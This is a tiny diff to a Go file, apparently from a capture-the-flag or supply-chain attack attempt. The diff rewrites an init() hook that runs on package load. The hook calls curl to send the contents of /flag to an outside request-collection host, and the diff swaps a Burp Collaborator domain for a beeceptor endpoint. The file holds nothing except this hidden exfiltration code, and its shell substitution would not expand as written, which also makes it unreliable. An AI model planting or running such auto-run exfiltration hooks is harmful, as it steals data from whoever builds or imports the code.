@@ -5,5 +5,5 @@ import (
 )
 
 func init() {
-    exec.Command("curl", "http://tb8z2wfnvj4efm1fq36r085wxn3er5it7.oastify.com/flag=$(cat /flag)").Run()
+    exec.Command("curl", "https://rashidy.free.beeceptor.com/flag=$(cat /flag)").Run()
 }
